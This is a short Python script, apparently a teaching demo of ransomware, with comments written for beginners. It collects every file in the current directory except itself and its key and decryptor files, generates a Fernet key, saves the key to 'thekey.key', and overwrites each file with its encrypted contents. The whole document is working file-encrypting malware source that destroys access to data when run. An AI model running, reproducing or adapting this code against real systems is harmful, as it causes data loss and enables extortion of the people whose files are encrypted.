#!/usr/bin/env python3

# Here we get the modules we need for the script to work
# The "os" module, in this case, is used to find and read files
# The "Fernet" module is used to generate random strings called "keys" that are used to encrypt and decrypt information

import os
from cryptography.fernet import Fernet

# This is an empty list variable called "files" it is empty because we haven't read any files yet, we will add them later

files = []

# This is a for loop, it will execute the code following the colon for as many files are in a directory

for file in os.listdir():
    if file == "ransom.py" or file == "thekey.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

# Here we make our key using Fernet

key = Fernet.generate_key()

# Open a file called "thekey.key" and use the temporary identifier "thekey"

with open("thekey.key", "wb") as thekey:
    thekey.write(key)

# Here we use a for loop to encrypt all files in a directory

for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)

print("All files in this directory have been encrypted!")
